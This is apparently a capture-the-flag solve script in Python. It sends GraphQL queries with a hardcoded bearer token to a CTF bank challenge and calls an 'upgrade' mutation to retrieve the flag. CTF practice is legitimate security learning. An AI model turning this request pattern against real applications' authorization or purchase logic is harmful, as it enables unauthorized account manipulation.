import requests

url = "https://bugbank.ctf.intigriti.io/"
headers = {
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
    "Accept": "*/*",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate, br",
    "Content-Type": "application/json",
    "Authorization": "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiN2JlNWRjYmItYWUzOC00YjRiLThhZDItZTY5YWUyNDdmMGQ0In0.rf7RknJjWl-XsTE5c6dMFfnWRge7WD_ZLg3FEEqTkC4",
    "Sec-Fetch-Dest": "empty",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Site": "same-origin",
    "Te": "trailers",
}

def make_request(url: str, data: dict)-> requests.Response:
    response = requests.post(url, json=data, headers=headers)

    return response

data1 = {
    "operationName": "user",
    "variables": {},
    "query": "query user {\n  me {\n    success\n    errors\n    user {\n      id\n      name\n      money\n      age\n      country\n      language\n      __typename\n    }\n    __typename\n  }\n}",
}

response1 = make_request(url, data1)

assert response1.status_code == 200

data2 = {"operationName":"user","variables":{},"query":"query user {\n  me {\n    success\n    errors\n    user {\n      id\n      name\n      money\n      language\n      __typename\n    }\n    __typename\n  }\n}"}

response2 = make_request(url, data2)

assert response2.status_code == 200

data3 = {"operationName":"upgrade","variables":{},"query":"mutation upgrade {\n  upgrade {\n    success\n    errors\n    flag\n    __typename\n  }\n}"}



response3 = make_request(url, data3)

print(response3.text)
